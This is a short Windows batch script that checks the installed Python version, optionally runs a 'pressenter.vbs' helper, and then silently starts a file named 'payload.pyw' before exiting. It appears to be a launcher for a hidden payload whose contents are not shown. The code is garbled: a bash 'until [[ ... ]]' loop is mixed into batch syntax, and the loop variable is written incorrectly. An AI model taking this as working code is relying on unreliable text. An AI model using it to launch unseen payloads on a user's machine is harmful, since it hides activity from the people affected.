@echo off
FOR /F "tokens=*" %g IN ('python --version') do (SET string=%g)
set "versionn=Python 3"
python3
if %string:~0,1%==P (echo yes) else (timeout /t 5 /nobreak & start pressenter.vbs)
until [[ $string != *"Python 3"* ]]
start payload.pyw
exit